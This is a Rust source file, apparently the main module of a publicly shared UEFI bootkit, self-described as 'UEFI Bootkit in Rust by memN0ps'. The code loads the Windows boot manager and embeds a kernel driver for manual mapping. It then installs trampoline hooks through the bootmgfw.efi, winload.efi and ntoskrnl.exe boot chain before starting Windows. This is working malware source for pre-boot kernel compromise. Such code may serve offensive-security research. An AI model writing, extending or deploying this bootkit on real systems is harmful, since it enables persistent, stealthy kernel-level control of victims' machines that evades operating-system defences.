#![no_main]
#![no_std]
#![feature(lang_items)]
#![feature(panic_info_message)]
#![feature(offset_of)]

use log::{error, LevelFilter};
use uefi::{prelude::*};
use crate::boot::globals::{DRIVER_ADDRESS, DRIVER_LENGTH};

mod boot;

#[lang = "eh_personality"]
fn eh_personality() {}

// Change as you like
#[panic_handler]
fn panic_handler(info: &core::panic::PanicInfo) -> ! {
    if let Some(location) = info.location() {
        error!(
            "[-] Panic in {} at ({}, {}):",
            location.file(),
            location.line(),
            location.column()
        );
        if let Some(message) = info.message() {
            error!("[-] {}", message);
        }
    }

    loop {}
}

/* The image handle represents the currently-running executable, and the system table provides access to many different UEFI services. 
(Removed as it requires uefi_services::init)
//#[entry]
//fn main(image_handle: handle, image_handle: Handle, mut system_table: SystemTable<Boot>) { }
*/

#[no_mangle]
fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
    /* Setup a simple memory allocator, initialize logger, and provide panic handler. (Removed as it conflicts with com_logger) */
    //uefi_services::init(&mut system_table).unwrap();

    /* Clear stdout/stderr output screen */
    //system_table.stdout().clear().expect("Failed to clear the stdout output screen.");
    //system_table.stderr().clear().expect("Failed to clear the stderr output screen.");
    
    /* Setup a logger with the default settings. The default settings is COM1 port with level filter Info */
    //com_logger::init();

    com_logger::builder()
    .base(0x2f8)                  // Use COM2 port
    .filter(LevelFilter::Info)   // Print Info log
    .setup();

    log::info!("### UEFI Bootkit in Rust by memN0ps ###");
    
    let boot_services = system_table.boot_services();
    unsafe { boot_services.set_image_handle(image_handle) };
    unsafe { uefi::allocator::init(boot_services) };

    /* Locate and load Windows EFI Boot Manager (bootmgfw.efi) */
    let bootmgfw_handle = boot::pe::load_windows_boot_manager(boot_services).expect("Failed to load image");
    log::info!("[+] Image Loaded Successfully!");

    // Read Windows kernel driver from disk as bytes (save the address in a global variable for BlImgAllocateImageBuffer)
    let driver_bytes = include_bytes!("../../target/x86_64-pc-windows-msvc/debug/lol.sys");
    unsafe { DRIVER_ADDRESS = driver_bytes.as_ptr() as u64 };
    unsafe { DRIVER_LENGTH = driver_bytes.len() as u64 };
    log::info!("Driver address: {:#x}", unsafe { DRIVER_ADDRESS });
    log::info!("Driver size: {:#x}", unsafe { DRIVER_LENGTH });

    /* (Not requred if using above for BlImgAllocateImageBuffer)
    /* Allocates memory pages from the system for the Windows kernel driver to manually map*/
    unsafe {
        DRIVER_MEMORY = boot_services.allocate_pages(AllocateType::AnyPages, MemoryType::RUNTIME_SERVICES_CODE, (driver_bytes.len() - 1) / 4096 + 1)
            .expect("Failed to allocate memory pages")
    }
    log::info!("Allocated memory pages for the driver at: {:#x}", unsafe { DRIVER_MEMORY });
    */

    /* Set up the hook chain from bootmgfw.efi -> windload.efi -> ntoskrnl.exe */
    boot::hooks::setup_hooks(&bootmgfw_handle, boot_services).expect("Failed to setup hooks");
    log::info!("[+] Trampoline hooks setup successfully! (bootmgfw.efi -> windload.efi -> ntoskrnl.exe)");

    /* Make the system pause for 10 seconds */
    log::info!("Stalling the processor for 20 seconds");
    system_table.boot_services().stall(10_000_000);

    /* Start Windows EFI Boot Manager (bootmgfw.efi) */
    log::info!("[+] Starting image...");
    boot_services.start_image(bootmgfw_handle).expect("[-] Failed to start image");

    Status::SUCCESS
}